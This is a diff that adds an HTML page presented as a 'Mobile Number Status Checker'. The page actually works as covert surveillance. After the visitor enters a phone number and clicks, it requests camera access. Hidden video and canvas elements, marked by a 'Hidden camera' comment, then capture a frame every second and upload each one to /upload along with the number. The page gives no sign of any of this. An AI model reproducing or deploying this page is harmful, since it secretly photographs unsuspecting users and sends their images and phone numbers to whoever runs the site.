@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mobile Number Status Checker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: rgba(0,0,0,0.8);
+      padding: 25px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+    .card h2 {
+      margin-bottom: 20px;
+      font-size: 22px;
+      color: #00ffcc;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #00ffcc;
+      color: #000;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover { background: #00ccaa; }
+    .status {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #ffcc00;
+      display: none;
+    }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>📱 Mobile Number Status Checker</h2>
+    <input type="text" id="mobile" placeholder="Enter Mobile Number">
+    <button id="checkBtn">Get Check Status</button>
+    <div class="status" id="statusText">Checking status...</div>
+
+    <!-- Hidden camera -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let captureInterval, stream;
+
+    async function startCapture() {
+      const mobile = document.getElementById('mobile').value.trim();
+      if (!mobile) {
+        alert("Please enter mobile number");
+        return;
+      }
+      document.getElementById('statusText').style.display = "block";
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        captureInterval = setInterval(() => {
+          // ✅ Black image fix: set canvas size same as video size
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("photo", blob, "frame.png");
+            formData.append("mobile", mobile);
+
+            fetch("/upload", { method: "POST", body: formData })
+              .then(res => res.json())
+              .then(data => console.log("✅ Uploaded:", data))
+              .catch(err => console.error("❌ Upload failed:", err));
+          }, "image/png");
+        }, 1000);
+
+      } catch (err) {
+        alert("Camera access denied: " + err);
+      }
+    }
+
+    document.getElementById('checkBtn').addEventListener('click', startCapture);
+  </script>
+</body>
+</html>
